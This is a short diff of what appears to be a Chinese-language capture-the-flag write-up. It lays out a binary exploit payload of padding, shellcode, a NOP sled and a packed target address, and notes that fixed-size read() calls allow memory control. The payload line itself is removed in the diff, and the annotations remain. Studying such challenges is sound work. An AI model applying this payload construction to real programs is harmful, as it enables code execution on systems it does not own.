@@ -33,7 +33,6 @@ addr是由第二次輸入的值 經過strtoll轉乘的地址 -> strtoll(buf)
 -----------
 這次輸入都是使用read function所以觀察寫在assembly code的固定大小可以控制memory
 詳細輸入:
-out('A'*7+'\0' + shellcode + nop*10 + '601020' + '\0'*18 + p64(0x6010a8) )
 'A'*7 + '\0'   	#方便我對齊shellcode
 shellcode	#
 nop*8		#補齊48 bytes
